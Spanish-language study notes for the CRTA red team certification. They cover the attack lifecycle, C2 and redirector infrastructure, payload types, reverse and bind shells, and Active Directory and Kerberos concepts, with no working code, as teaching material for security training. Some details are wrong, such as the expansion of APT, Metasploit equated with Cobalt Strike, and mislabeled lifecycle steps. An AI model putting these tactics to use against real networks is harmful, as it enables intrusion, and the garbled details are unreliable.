---
title: CRTA Certified Red Team Analyst
layout: page
permalink: /Notas_CRTA_Certified_Red_Team_Analyst
---

<h2 id="whity">CRTA Certified Red Team Analyst</h2>


<h2 class="amarillo">Introducción</h2>

EL CRTA es para principiantes en seguridad de la información ofreciendo una experiencia practica. Tendremos un material de estudio, practicas de laboratorio, vídeos y manuales PDF. Este curso es centrado en desarrollar la comprensión de la mentalidad y las tácticas, técnicas y procedimientos TTP empleadas por los agentes de amenaza. Y esta dirigido a aquellos que aspiran a convertirse en profesionales Red Team. Finalizando el curso se tendrán las habilidades y conocimientos esenciales para una trayectoria exitosa en el campo.

<h2 class="amarillo">Proceso de certificación</h2>

Para lograr la certificación se debe:

- Inscribir en el CRTA
- Completar el material de estudio [Vídeos + PDF]
- Programar el acceso al laboratorio de 30 días iniciando sesión en CCSP
- Programar un espacio de examen de 6 horas a través del portal CCSP
- Capturar y enviar banderas durante la ventana del examen
- Obtener el certificado como recompensa

> NO HAY QUE HACER UN INFORME ESCRITO, EL EXAMEN CRTA SE BASA ÚNICAMENTE EN FLAGS

<h2 class="amarillo">Información de acceso al laboratorio</h2>

- El laboratorio es por 30 días y se debe programar desde el portal de CCSP
- Según nuestra conveniencia es solicitado el laboratorio, una vez iniciado no se podrá detener

---

<h2 class="amarillo">Material del curso - Introducción al Red Team</h2>

<h2 class="amarillo">BRT-Intro#1</h2>

En resumen se habla en esta sección sobre las bases del Red Team, incluyendo su propósito y la importancia en ciberseguridad. Alguna de las terminologías y tecnologías utilizadas.

- Que es el Red Team?
- Red Team Attack Lifecycle (Fases)
- Red Team Infrastructure (Nomenclatura)
- Enterprise Environment Overview
- Tecnologías de explotación en Red Team
    - Tecnologías web
    - Tecnologías de redes
    - Tecnologías en la nube
    - Red Team físico
    - Inalámbrico

<h2 id="whity">1.1 Que es el Red Team?</h2>


Muchos de nosotros estamos interesados en hacer ataques, pero las personas encargadas de hacer este trabajo son los Red Team, un grupo de empleados especializados en tecnologías y no es un trabajo de una sola persona.

- Podemos decir que Red Team es un grupo de "hackers" con una variedad de experiencia que ponen a prueba la infraestructura de las organizaciones.
- Los ataques hechos por el Red Team están divididos en 3 grupos:
    - Cyber (Ataques digitales, Web, Redes y otras tecnologías de la nube)
    - Ataques sociales (Explotar el comportamiento de las personas)
    - Físicos (Ataques que requieren de intervención manual)
- Es muy similar a las pruebas de pentesting pero estas son mas dirigidas.
- Uno de los principales objetivos del Red Team es probar las habilidades de detección de una organización y las habilidades de respuesta.

> Todo con el fin de identificar las vulnerabilidades.

Los ataques hechos por el Red Team son muy similares a los ataques hechos por los agentes de amenaza, un concepto interesante es el de APT Advanced Persistence Typegroups donde los Red Teamers copian sus técnicas y estrategias.

Esto permite que el equipo defensivo vea 24/7 como pueden los agentes de amenaza propagarse en una red.

1. Red Team Emulation que es copiar las técnicas de los agentes de amenaza.
2. Red Team Simulation que es imitar el agente de amenaza.

> El objetivo del Red Team no es ganar MAXIMOS privilegios, es identificar los aspectos presentes en la organización que son críticos.

El equipo rojo intentara tener acceso a información sensible de cualquier forma posible, usando discreción para no dejar huellas durante el proceso. Haciendo esto se mejoran los procesos de la infraestructura de una empresa.

> Obvio grandes empresas están usando estos equipos Red Team dentro de sus redes internas.

Esta es la diferencia entre la prueba de penetration testing y el Red Team, ya que este ultimo es como actuaria el agente de amenaza real.

| Pentester | Red Team |
| --- | --- |
| Un ataque hacia un host, red o otra aplicación para medir y identificar riesgos asociados del ambiente del objetivo | Utiliza las técnicas empleadas por los agentes de amenaza con el fin de defender un ambiente |
| Mas énfasis en reducir las vulnerabilidades expuestas | Mas énfasis en entrenar y medir riesgos, con el fin de defender a una organización. Ejercicios para el Blue Team |
| El alcance suele ser 1 a 2 sistemas o redes | Puede ser una parte especifica o toda una organización (El Red Teamer debe estar en capacidad de acceder a todos los dispositivos de la red) |
| Asumen sobre el ambiente y pueden no probar donde se les pida | No asumen, y intentan comprometer todo lo que puedan, hacen pivoting cambian de estrategias, y técnicas en caso de necesitarlo |
| Usan herramientas que ya tienen durante la prueba o en sus entornos | Constantemente buscan por nuevos exploits, vulnerabilidades y implementan ataques con nuevas herramientas tan pronto las descubran |
|  |  |

Entendida la diferencia entre pentester y Red Team, sigue comprender el Ciclo de vida empleado por los agentes de amenaza (Con el fin de hacer algún daño a la organización, ya que siempre hay una intención por detrás de las actividades que realizan).

<h2 id="whity">1.2 Red Team Attack Lifecycle (Fases)</h2>

<h2 class="verde">Paso 1 - OSINT Exhaustivo</h2>

Primero hacen **OSINT** a niveles extensivos de información publica para identificar eslabones débiles desde Internet y hacen un gran recopilado de información para ganar acceso a la red de la organización.

- Esta fase generalmente se centra en recopilado de información sobre algún objetivo de la organización, esta información puede estar publicada en redes sociales.
- Mucha información se puede recopilar desde redes sociales ya que son plataformas donde los empleados son activos.
- La información suele ser mas publica de lo que se cree y muchas veces es muy sensible, permitiendo así que los atacantes las utilicen para sus propósitos de explotación.

<h2 class="verde">Paso 2 - Acceso inicial y ejecución</h2>

Con la información recopilada sigue explotar el eslabón mas débil y tratar de ganar acceso a la maquina o la red. Todo esto es debido a que la mayor vulnerabilidad de una empresa son las propias personas que trabajan allí (Empleados) los cuales fácilmente y recurrente mente caen en ataques como Phishing.

- Aquí se trata de aprovecharse de distintos vectores de ataque para conseguir un acceso inicial a la red.
- Suelen ser vulnerabilidades web, malas configuraciones que permitan a un atacante ganar acceso a la red interna.
- Siempre se depende de las tecnologías utilizadas por la organización y muchas de ellas pueden ser obtenidas en el paso anterior de **OSINT**.
- Cuando se habla de execution estamos diciendo que el código creado por un agente de amenaza esta ejecutándose en la maquina objetivo. Siempre tratan de atacar algún servicio y generalmente suelen ser de conexiones remotas.

<h2 class="verde">Paso 3 - Persistencia y Escalada de privilegios</h2>

Si el atacante tiene acceso a la red interna o infraestructura, lo primero es ganar persistencia y luego escalar privilegios.

- Aquí se habla sobre como el agente de amenaza siempre mira por técnicas inusuales para mantener acceso en los sistemas aunque estos se reinicien, cambien de credenciales, y que puedan cortar el acceso.
- Un ejemplo es cambiar la contraseña de un usuario de bajos privilegios por ejemplo y usarlo como backdoor.
- Luego la escalada de privilegios es ganar acceso como ROOT / NT-AUTHORITY SYSTEM a través de malas configuraciones.

Las cuentas con estos accesos privilegiados son:

- SYSTEM/ ROOT LEVEL
- Local Administrator
- User with admin capabilities
- Privileged Groups

El atacante o APT cambia del usuario con bajos privilegios a uno de los usuarios o cuentas privilegias en el sistema.

<h2 class="verde">Paso 4 - Movimiento Lateral</h2>

Podemos decir que el movimiento lateral consiste cuando un APT compromete o gana control de uno de los HOST dentro de una red y se va moviendo entre dispositivos dentro de la misma red.

Si la organización cuenta con algún control como antivirus o firewall, el atacante va a tratar de burlarlos para ganar acceso a la red.

- Pueden los agentes de amenaza crear su propio acceso remoto para lograr el movimiento lateral (Puede ser usando credenciales o propias herramientas).
- Pueden usar Phishing o explotar servicios remotos (ssh, vncm rdp).

<div style="text-align: center;">
  <img src="/assets/images/CRTA/image.png" alt="under" oncontextmenu="return false;">
</div>

Description de movimiento lateral desde fuera de una red hasta entrar a la red LAN interna. Esto se debe a que la maquina PC hace parte de la red interna pero esta expuesta afuera de esta haciendo posible que un agente de amenaza pueda hacer todo el recorrido.

<h2 class="verde">Paso 5 - Evasión Defensiva</h2>

Este paso es de descubrimiento de la red y su infraestructura para encontrar información critica dentro del servidor para comprometer documentos, o información privilegiada. Tienen mucho cuidado los APT y agentes de amenaza de no dejar información de sus accesos remotos ni huellas dentro de los sistemas comprometidos. (La mentalidad del APT es pensar siempre como burlar).

- Podemos decir que trata de evitar estos controles de seguridad para lograr comprometer los objetivos.
- Los scripts se ofuscan para no ser detectados tan fácilmente, escondidos en procesos confiables y desactivando software de seguridad.
- Por eso es importante tener una noción de los procesos confiables del sistema
- Ejemplo: Impair Defenses: Es deshabilitar firewalls y antivirus con el fin de que no detecten nuestra actividad maliciosa

<h2 class="verde">Paso 6 - Descubrimiento</h2>

Este paso es lograr persistencia con los mayores privilegios para lograr acceso total en cualquier momento en el la maquina del eslabón mas débil para lograr acceder a la organización y su red interna. Generalmente el agente de amenaza o el APT trata de dejar un Backdoor para tener persistencia en la red.

- El agente de amenaza trata de mapear el ambiente de la organización
- Se utilizan técnicas que el agente de amenaza aprovecha para decidir como debe actuar.
- Recopilan información.
- Ejemplo es el descubrimiento de archivos y directorios mediante enumeración en busca de ubicaciones con información privilegiada.

**Recolección de datos**
Es el proceso de recopilar información del sistema, esta puede ser sensible y puede estar presente en el sistema o la red. Esta información puede ser filtrada por un agente de amenaza o encriptarla o comprimirla. También el agente de amenaza puede robar datos almacenados en la clipboard.

**Filtración de datos**
Una vez que los datos críticos han sido identificados por los atacantes, estos pueden ser robados por los agentes de amenaza.

<h2 class="verde">Paso 7 - Recolección de datos</h2>

Aquí es cuando encontramos la información critica y el APT tratara de conseguirla a toda costa para filtrarla o robarla. Toda esta información esta dentro de los sistemas y se tratara de conseguir de cualquier manera. El ejemplo es una contraseña almacenada en buffer de la clipboard y conseguirla.

<h2 class="verde">Paso 8 - Data Exfiltration</h2>

Es cuando la información de la organización es extraída por medios físicos o mediante compresión de archivos, dando así concluido el robo de información.

<div style="text-align: center;">
  <img src="/assets/images/CRTA/image 1.png" alt="under" oncontextmenu="return false;">
</div>
La matrix de MITRE para ayudar a los equipos dentro de las organizaciones a defender sus redes.

La comparación MITRE a hecho trabajo enorme para ayudar a los equipos Blue Team

Los APT y agentes de amenaza suele intentar muchas técnicas las cuales ya han sido documentadas en una MATRIX ayudando a los equipos **Blue Team** para mitigar estas incidencias. Donde esta MATRIX esta separada por filas de Tácticas y la information de cada columna representa las técnicas, y cada técnica tiene una subtécnica.

<h2 id="whity">1.3 Red Team Infrastructure</h2>

Aquí conocemos un Command and Control Server que son utilizados por los agentes de amenaza para mantener persistencia en las maquinas que comprometen.

<div style="text-align: center;">
  <img src="/assets/images/CRTA/image 2.png" alt="under" oncontextmenu="return false;">
</div>

Podemos verlo como un APT o un Red Teamer con su C2 para mantener acceso remoto.

Utilizando un C2 Server que contiene unos módulos muy detallados para controlar la Maquina Virtual (Tambien puede ser la de una victima en especifico). Uno de los mejores ejemplos es **Metaesploit (Cobalt Strike).**
<div style="text-align: center;">
  <img src="/assets/images/CRTA/image 3.png" alt="under" oncontextmenu="return false;">
</div>

El Payload Server permite al APT mover sus scripts hacia el equipo victima de la red interna.

Para el Red Teamer o un agente de amenaza no querrán que su maquina o su propia infraestructura sea públicamente accesible desde la red de la victima, entonces lo que hacen es configurar un server accesible desde la internet en donde el Payload Server almacena los scripts, software malicioso y demás utilidades utilizadas por los agentes de amenaza o el Red Teamer.

<h2 class="amarillo">Redirector Server</h2>

Un sistema de redirección se encarga de configurar proxies que mueven todo el trafico a nuestro C2 (Command and Control). Permitiendo así esconder “la cara” de los APT, y existen bastantes Servidores de Redirección.

- Los agentes de amenaza no utilizan un sistema para lanzar ataques y obtener Shells, ellos configuran multiples sistemas para actuar como Puntos de Pivot (redirectores) hacia sus servidores C2.
- Esto previene al cliente de estar en capacidad de ver nuestro C2, y debería ser fácil de instalar y desmantelar.

Todo esto es con el fin de que los equipos de incidencias de las organizaciones puedan rastrearnos, sirviendo asi los proxies como intermediarios entre el C2 del APT y la red de la victima.
<div style="text-align: center;">
  <img src="/assets/images/CRTA/image 4.png" alt="under" oncontextmenu="return false;">
</div>

Pueden existir 10, 15 Redirector servers para el APT poder esconderse y mantenerse anonymous.

- Adversary Emulation: Es imitar a alguien o algo, basados en inteligencia se determina sin FIN10 group es propenso de poner como objetivo una organización. Se copian todos los pasos de inicio a fin.
    - Por ejemplo: Para emular este adversario, se imita el TTPs que ellos utilizan y para probarlos en nuestro ambiente, nos comportamos como ellos lo harían.
- Adversary Simulation: Consiste en hacer exactamente como si un APT este intentando algo cuando en realidad nada sucede.
- Advance Persistent Threat APT: Es un agente de amenaza sigiloso, es muy común verlos hacer parte de una nación o un grupo patrocinado que ganan acceso no autorizado a equipos dentro de la red y se mantienen invisibles sin detectar por largos periodos de tiempo. Siempre tienen malas intenciones y tienen como fin causar algún tipo de daño.
- Exploit: Es el código con el cual un agente de amenaza puede tomar ventaja sobre alguna mala configuración o loop-hole.
- Vulnerabilidad: Es cuando el loop-hole esta en un software en particular o en el hardware, por lo tanto es llamado loop-hole. Aunque también puede entenderse como el eslabón mas débil que un APT utiliza para comprometer un sistema.

<div style="text-align: center;">
  <img src="/assets/images/CRTA/image 5.png" alt="under" oncontextmenu="return false;">
</div>
Se hace uso de la vulnerabilidad web (Nivel de Software) que permite al APT abusar y lograr acceso al host.

<h2 class="amarillo">De-Militarized Zone Network (DMZ Network)</h2>

Aquí es donde se localizan los servers y servicios que los empleados y usuarios acceden para sus tareas diarias.

- Es una red (física o lógica) usada para conectar hosts que proveen una interfaz hacia una red externa (Untrusted external network).
- Los sistemas que son mas vulnerables a ataques son aquellos que proveen servicios a los usuarios afuera de la red LAN, suelen ser de **correo electrónico, servicios web** y **Nombres de Dominio (DNS)** que estén presentes dentro de la DMZ.
- La finalidad de la DMZ is la de permitir el acceso de recursos desde redes publicas (Untrusted networks) mientras mantienen las redes LAN privadas seguras.

<h2 class="amarillo">Militarized Zone Network (MZ Network)</h2>

Es todo lo contrario a la DMZ, aquí solo los usuarios con ALTOS PRIVILEGIOS tiene acceso a la MZ:

- Este lugar tiene la maxima seguridad y uno de los segmentos mas seguros en el ambiente.
- Contiene la mayor cantidad de informacion critica sobre la organizacion.
- Todas las operaciones de la organización son gestionadas desde la MZ.

<h2 class="amarillo">Tácticas, Técnicas y Procedimientos (TTPs)</h2>

Toda la parte de TTPs la podemos ver en la MATRIX de MITRE:

- TTPs explican como los agentes de amenaza elaboran y gestionan los ciberataques.
- Explica los métodos asociados a un agente de amenaza en especifico o un grupo APT.
- Una **Táctica** es el mas alto nivel de descripción de un agente de amenaza y su comportamiento.
- **Técnicas** dan una explicación detallada sobre un comportamiento en el contexto de una táctica.
- **Procedimientos** incluso a bajo nivel, muy detallados en cuanto a la descripción en el contexto de una técnica.

<h2 class="amarillo">Listener</h2>

- El listener espera por conexiones entrantes desde la maquina objetivo. Suele ser por TCP.
- En nuestro laboratorio, vamos a poner nuestra maquina en escucha y la maquina objetivo se conectara de vuelta a nosotros completando una explotación.
- Básicamente Listening significa abrir un puerto y esperar por conexiones entrantes.
- Herramientas como netcat, nc y ncat son el mejor ejemplo disponible para ambos Linux y Windows.

<h2 class="amarillo">Explotación</h2>

Esta es la fase que se realiza una vez se ha identificado una vulnerabilidad.

- Suele ser un servicio corriendo en una maquina, una aplicación web, o un software como el objetivo a explotar.
- Una mala identificación de la vulnerabilidad puede resultar en problemas de compatibilidad generando caídas de servicios.
- Se debe hacer una enumeration exhaustiva antes de entrar a la fase de explotación.
- En esta fase el atacante tiene acceso al sistema después de tomar ventaja de la vulnerabilidad.
- El acceso puede ser tanto físico como remoto, pero nosotros lo demostraremos de forma remota.
- Si el exploit se acontece con éxito, el código del payload se ejecutara.

<div style="text-align: center;">
  <img src="/assets/images/CRTA/image 6.png" alt="under" oncontextmenu="return false;">
</div>
Este es todo el proceso de explotación que haría un Red Teamer o un APT, una vez hallada una vulnerabilidad esta se explota por un mala configuración o lo que sea “Exploit”, mediante el Exploit se puede inyectar el Payload con las instrucciones maliciosas.

<h2 class="amarillo">Payloads - (Singles, Stagers, Stages)</h2>

Estos son algunos de los payloads dentro del framework Metaexploit y C2.

- Singles son aquellos que ya contienen el payload asignado para hacer una tarea en especifico (Crear un usuario, o una Bind Shell). Por ejemplo **payload/windows/adduser**.
- Stagers son el tipo de payload que son usados para descargar un gran payload en la maquina objetivo desde la maquina del atacante, también crea una conexión por red entre el atacante y la maquina comprometida. Por ejemplo **payload/windows/shell/bind_tcp**.
- Stages que son un payload grande y son descargados por los Stagers y son ejecutados. Son asignados para hacer tareas mas complejas como Remote Desktop, meterpreter. Por ejemplo **payload/widows/shell/bind_tcp**.

<h2 class="amarillo">Shells</h2>

Son interfaces de usuario a nivel de cliente mas no de interfaz grafica, para interactuar con el sistema y gestionar el ambiente de un sistema o maquina mediante la linea de comandos.

- Es usada para administración y algunas veces es descrita como la mejor opción a nivel de seguridad que los clientes de interfaz grafica.
- En Windows tenemos el Command Prompt y PowerShell.
- En Linux tenemos Bash Shell y SH Shell.

<h2 class="amarillo">Reverse Shells</h2>

La importancia de las Shells recaen en las Reverse Shell, hablando entonces de algunos escenarios tenemos que:

- La maquina objetivo se conecta hacia nosotros.
- Toda la comunicación va a traves de puertos TCP específicos.
- Necesitamos tener un LISTENER activo en la maquina atacante.
- Una de las mejores herramientas para entablar este tipo de conexiones es netcat = nc.
<div style="text-align: center;">
  <img src="/assets/images/CRTA/image 7.png" alt="under" oncontextmenu="return false;">
</div>

Imagen de la Reverse Shell donde el atacante abre el puerto y recibe una conexión por parte de la maquina servidor.

<h2 class="amarillo">Bind Shells</h2>

Las Bind Shells son especiales

- El atacante se conecta a la victima.
- El atacante abre un puerto TCP en la maquina victima y hostea una shell.
- Todo aquel que se conecte a la maquina victima y por un puerto especifico tendrá una shell
- Esta shell puede ser usada para expandir el compromiso del servidor.

<div style="text-align: center;">
  <img src="/assets/images/CRTA/image 8.png" alt="under" oncontextmenu="return false;">
</div>

El agente de amenaza se conecta directamente al servidor por el puerto abierto.

<h2 class="amarillo">BRT-Intro#2</h2>

Aquí se abordaran las tecnologías que son usadas a nivel de compañías y organizaciones, también sobre Directorio Activo y como todo se gestiona en una empresa a nivel de infraestructura.

<div style="text-align: center;">
  <img src="/assets/images/CRTA/zone.png" alt="under" oncontextmenu="return false;">
</div>

Infraestructura de una empresa, donde el Red Team o los APT hacen su cosas. Luego tenemos la DMZ que puede contar con servicios de correo electrónico o web servers (los cuales son públicos y accesibles desde internet), la red de la empresa LAN y la MZ.

<h2 id="whity">1.4 Enterprise Environment Overview</h2>

Las redes empresariales consisten de varios roles asignados por servidores, los cuales son dados de la siguiente manera:

- Servidor Web:
    - Es un software que entiende a traves de las URL (Direcciones WEB) y HTPP (Como protocolo que nuestro navegador utiliza para visitar las paginas). Un Servidor HTTP puede ser accesible desde nombres de dominio, y retorna el contenido almacenado en los sitios web al cliente del usuario final.
    - Tambien pueden ser accesibles desde un equipo donde la informacion web ha sido almacenada de forma local. Básicamente un servidor web es usado para almacenar sitios.
    - Servidores Web Externos son colocados en las DMZ, sirviendo así a las peticiones de los clientes.
    - Estos son generalmente conectados a la red interna (Enterprise Network).
- Mail-Server:
    - Un servidor de email es saquel que maneja y envía correos sobre la red, usualmente sobre internet.
    - El servidor mail puede recibir correos desde computadores cliente y enviar a otros servidores de correo. Un servidor de correo puede también comunicarse con otros clientes de correos en computadores.
    - Cuando se presiona el boton “Send Email” el cliente de correo electronico se conectara al servidor en la red interna/ internet y esto es llamadado como SMTP Server. Y no es mas que un acrónimo para Simple Mail Transfer Protocol y es un protocolo que se usa cuando los clientes de correo se envían información a los servidores de correo.
    - Cuando descargamos correos electrónico, el servidor de correo se conecta a un servidor en la red llamado POP3 Server.
- Database-Server (or SQL-Server):
    - Servidores de bases de datos son utilizados para almacenar y gestionar la información para dar acceso solo a los usuarios autorizados.
    - Una base de datos es util cuando una organización tiene mucha información sobre si en el día a día.
    - Tambien permite a los usuarios y las aplicaciones acceder a información a traves de la red.
    - Permite distintas operaciones como modificar datos, agregar o eliminar datos. Y suele ser a traves de SQL y queries.
- Bastion-Host (Jump Server):
    - Un Bastion Host es una computadora o red con un propósito especial y esta diseñado específicamente y configurado para aguantar ataques.
    - La computadora generalmente hostea una unica aplicación, por ejemplo un servidor proxy, y otros servicios que son removido o limitados para reducir el riesgo de amenazas al computador.
    - Suelen ser accesibles desde SSH o RDP.
    - Una vez la conexión remota ha sido establecida dentro del Bastion Host, entonces actúa como un Servidor Jump (Puente), que nos permite usar SSH o RDP para iniciar sesión en las instancias (dentro de las subnets privadas).

Por lo general para acceder a los usuarios con altos privilegios usamos los jump de estos servers, ya que el cliente lo utiliza y de eso nos aprovechamos.

- Automation Server:
    - Son parte crucial del flujo de desarrollo de software.
    - Ayuda a automatizar el desarrollo de software (Building, Testing, Y despliegues) facilitando la integración continua. Algunos ejemplos son Jenkins Server, TeamCity, Bamboo.

Retomando entonces al gráfico inicial sobre el ambiente empresarial, vemos que las redes suelen estar segmentadas (y segmentadas en algunos casos) y que todos los usuarios y empleados trabajando dentro de la organización hacen parte del rol del que son asignados. El primero del cual es mas accesible es el DMZ con los servidores web o lo que quiera la empresa exponer en la Internet. Seguido esta un Firewall hacia la Enterprise Network (Departamento de Ventas, desarrollo, testing, etc). Pasamos a otro Firewall y luego a la MZ Militarized Zone con servidores críticos donde se aloja lo mas importante, por eso suele ser el objetivo principal de un Red Teamer o APT.

**Uniform Resource Locators** es el acrónimo de URL.
<div style="text-align: center;">
  <img src="/assets/images/CRTA/image 9.png" alt="under" oncontextmenu="return false;">
</div>

El Bastion Server suele estar entre un Firewall y el acceso al servidor DB con los usuarios con altos privilegios.

<h2 class="amarillo">Directorio Activo - (Active Directory)</h2>

El directorio activo como su nombre lo sugiere es un directorio (o base de datos) que permite:

- Manejar los recursos de una organización como (usuarios, computadoras, recursos compartidos).
- Provee reglas de acceso para administrar las relaciones entre los recursos.
- Almacenan información sobre los objetos en la red y los hace disponibles a los usuarios y administradores.
- Otorga una administración centralizada de recursos digitales.

<div style="text-align: center;">
  <img src="/assets/images/CRTA/image 10.png" alt="under" oncontextmenu="return false;">
</div>

Es una tecnología muy utilizada en empresas porque permite fácilmente manejar información, data, y usuarios de forma centralizada.

Es un producto de Microsoft y ciertamente es muy utilizado.

<h2 class="amarillo">Active Directory Forest/Domain</h2>

Hay 4 grupos de los cuales es importante hablar al mencionar el Directorio Activo:

- Forest siendo una única instancia de Directorio Activo, es básicamente una colección de Domain Controllers que confían los unos los otros.
- Dominios pueden ser pensados como contenedores con un alcance al Forest.
- Organizational Units (ou’s) son un agrupamiento lógico de usuarios, computadores y otros recursos.
- Groups es la colección de grupos de usuarios (Privilegiados y no privilegiados).

Los recursos computacionales son descritos dentro del Forest. (Puede contener muchos equipos o redes).

<div style="text-align: center;">
  <img src="/assets/images/CRTA/image 11.png" alt="under" oncontextmenu="return false;">
</div>

Representación de un DC Domain Controller 1 dentro del Forest.

<h2 class="amarillo">Objetos del Directorio Activo</h2>

- Las entidades físicas que hacen de una red organizada.
- Domain Users:
    - Aquellas cuentas de usuario que son permitidas para la autenticación a las maquinas/servers dentro del dominio.
- Domain Groups:
    - Pueden ser usadas para asignar permisos en cualquier dominio.
- Domain Computers:
    - Maquinas conectadas al dominio y se convierten en miembros del mismo.
- Domain Controller:
    - Cuando el servidor esta centralizado y responde a las medidas de autenticación y maneja varios recursos como computadoras, usuarios y grupos.
- Group Policy Objects (GPOs):
    - Colección de pólizas que son aplicadas a un conjunto de usuarios, dominios, objetos de domino.
- Ticket Granting Ticket:
    - Tickets usados específicamente para autenticación.
- Ticket Granting Service (TGS):
    - Tickets usados específicamente para autorización.

<div style="text-align: center;">
  <img src="/assets/images/CRTA/image 12.png" alt="under" oncontextmenu="return false;">
</div>

Hay una serie de grupos privilegiados dentro del Directorio Activo

| Privileged Groups | Privileges |
| --- | --- |
| Domain Admins (DA) | Tienen acceso administrativo a todos los recursos del dominio |
| Enterprise Admins (DA) | Existe únicamente en la raíz del Forest, y es agregado aa Domain Admins de cada hijo |
| BUILTIN\Administrators (Local Group) | Administradores locales de un Domain Controller |
| Server Operators | Tienen la habilidad de administrar un domain server |
| Account Operators | Manejan cualquier usuario que no este dentro de un grupo privilegiado |

<h2 class="amarillo">Kerberos Authentication</h2>

Trabaja en el puerto 88 de TCP.

Dentro de los ambientes de directorio activo, todas las queries de autenticación y su proceso se hace mediante tickets. Por lo tanto, las contraseñas nunca se transmiten a través de la red.

Un ticket es una forma de autenticación y token de autorización que puede ser de las siguientes dos categorías:

- Ticket Granting Ticket (TGT) para autenticación.
- Ticket Granting Service (TGS) para autorización.

Los Tickets (TGT Y TGS) son almacenados en memoria y pueden ser extraídos y utilizados para representar credenciales de usuario.

En especial los TGS que pueden ser usados para acceder a un servicio especifico de un servidor en el dominio.

Nada se guarda en disco sobre los Tickets, todo es en memoria.

<div style="text-align: center;">
  <img src="/assets/images/CRTA/image 13.png" alt="under" oncontextmenu="return false;">
</div>

Primer paso de autenticación con Kerberos, la solicitud del TGT

<div style="text-align: center;">
  <img src="/assets/images/CRTA/image 14.png" alt="under" oncontextmenu="return false;">
</div>

Segundo paso de autenticacion con Kerberos, recibir el TGT

<div style="text-align: center;">
  <img src="/assets/images/CRTA/image 15.png" alt="under" oncontextmenu="return false;">
</div>

Tercer paso de autenticación con Kerberos, solicitud del TGS

Segundo paso de autenticacion con Kerberos, recibir el TGT

<div style="text-align: center;">
  <img src="/assets/images/CRTA/image 16.png" alt="under" oncontextmenu="return false;">
</div>

Cuarto paso de autenticación con Kerberos, uso y validación del TGS


<div style="text-align: center;">
  <img src="/assets/images/CRTA/image 17.png" alt="under" oncontextmenu="return false;">
</div>

Todo el flujo que debe hacer un usuario dentro del Active Directory para solicitar acceso a un servicio corriendo dentro de su dominio, en este caso el acceso a un servidor SQL utilizando la autenticación Kerberos con TGT y TGS

<h2 class="amarillo">BRT-Intro#3</h2>

<h2 class="amarillo">Kerberos Delegation</h2>

Permite a que las credenciales de un usuario autenticado puedan ser reutilizadas para acceder a recursos dentro de un servidor diferente en un dominio.

- Es útil en multi-tier applications o arquitecturas.
- Por ejemplo: Un usuario de dominio se autentica a la aplicación de un servidor y esta aplicación de servidor hace un llamado a la base de datos. La aplicación puede solicitar acceso a un recurso de base de datos como el usuario de dominio (Esta impersonificando al usuario) y no lo esta haciendo con la cuenta del servicio de la aplicación.
- La cuenta de aplicación de servicio debe ser de confianza para la Delegation para poder hacer las solicitudes como el usuario autenticado de dominio.

<div style="text-align: center;">
  <img src="/assets/images/CRTA/image 18.png" alt="under" oncontextmenu="return false;">
</div>

Kerberos Delegation, donde la Application Server si autentica con las credenciales del Domain User a la Database Server

Parece que la aplication server account tiene la capacidad de tener máximos privilegios sobre el Database Server o que la autenticación falle (Depende de la configuración que se tenga)

<h2 class="amarillo">Tipos de Kerberos Delegations</h2>

- **Unconstrained Delegation:** Permite al usuario de la aplicación solicitar **CUALQUIER** servicio en cualquier servidor en el dominio.
    - La unconstrained delegation esta por defecto habilitada en los Domain Controllers
- **Constrained Delegation:** Permite al usuario de la aplicación solicitar acceso **SOLO** a un servicio especifico en servidores especificos.

<h2 class="amarillo">Domain Trusts</h2>

Los dominios de confianza representan relaciones entre 2 dominios o bosques (Forests) que permiten a los usuarios o servicios de un dominio o de un Forest acceder a recursos en otro dominio o en otro Forest.

- **Tipos de Confianza**:
    - **Parent Child Trust Relationship**
    - **Forest to Forest Trust Relationship**
    - **Tree-root Trust Relationships**
- La confianza ayuda a identificar las entidades en un dominio o en un Forest.

<div style="text-align: center;">
  <img src="/assets/images/CRTA/image 19.png" alt="under" oncontextmenu="return false;">
</div>

**One Way Trust** donde un dominio tiene usuarios que requieren de acceder a algún tipo de recurso que se encuentra en otro dominio, entonces el dominio que presta el servicio establece una relación de confianza con el **Dominio que requiere sus servicios**, ya de esta forma el dominio de confianza puede solicitar acceso a los recursos que necesita.

<div style="text-align: center;">
  <img src="/assets/images/CRTA/image 20.png" alt="under" oncontextmenu="return false;">
</div>

**Two Way Trust** donde ambos dominios tienen usuarios y recursos que requieren de acceso bidireccional, por tanto entre ambos dominios se puede acceder a recursos.

<div style="text-align: center;">
  <img src="/assets/images/CRTA/image 21.png" alt="under" oncontextmenu="return false;">
</div>

**Parent-Child Trust**, la relación entre los dominios permite administración de todos los recursos de la organización, por ejemplo el **Child Domain** administra **(Marketing, Sales, Management)** y el **Parent Domain** administra todo el dominio como tal

La diferencia es que el paso 5, donde el Domain User solicita el TGS no se lo pedirá al Child Domain, sino al Parent Domain.

- Esto se debe a que el Application Server no esta dentro del alcance del Child Domain, pero si lo esta del Parent Domain.

<div style="text-align: center;">
  <img src="/assets/images/CRTA/image 22.png" alt="under" oncontextmenu="return false;">
</div>

**External Trust**, es cuando un árbol A no confía en un árbol B, entonces la confianza es establecida entre un dominio de un árbol puede ser Bidireccional, unidireccional y por supuesto la confianza con el padre **Parent Child Trust**.

<div style="text-align: center;">
  <img src="/assets/images/CRTA/image 23.png" alt="under" oncontextmenu="return false;">
</div>

**Forest Trust**, dentro de cada Forest hay un Active Directory, no hay mucho que decir, mas allá de que cada Forest confía en el otro de forma mutua, por tanto hay acceso entre todos los dispositivos pasando por cada Active Directory de los Forests

<h2 class="amarillo">Autorización en Active Directory</h2>

La autorización significa que un usuario es específicamente permitido o negado a acceder a un recurso en la red del Active Directory.

- El AD valida el acceso a un recurso basado en un token de seguridad del usuario.
- El token de seguridad es un procedimiento para revisar si el usuario es parte del Access Control List (ACL) para el objeto solicitado.
- Los security tokens estan compuestos de:
    - User Rights
    - Group SID
    - Individual SID
- El principal medio a través del cual se identifica un security principal es al tratar de acceder a cualquier securable
object es un identificador llamado identificador de seguridad (SID) que es único para cada usuario o grupo de seguridad.

<div style="text-align: center;">
  <img src="/assets/images/CRTA/image 24.png" alt="under" oncontextmenu="return false;">
</div>

Fundamentos de Autorización, el token de seguridad es generado cada vez que el usuario inicia sesión (La información del token valida los derechos de un usuario a nivel de red, y los grupos ya que puede tener algún grupo privilegiado y se le deben respetar los permisos del grupo al que pertenezca), y el Individual SID es único por usuario.

<div style="text-align: center;">
  <img src="/assets/images/CRTA/image 25.png" alt="under" oncontextmenu="return false;">
</div>

Validación del Token con el DACL para el acceso de usuarios con recursos compartidos a nivel de red dentro del Active Directory. Importante que el ACE Access Control Entities guarda la información de IDS para acceso a recursos.

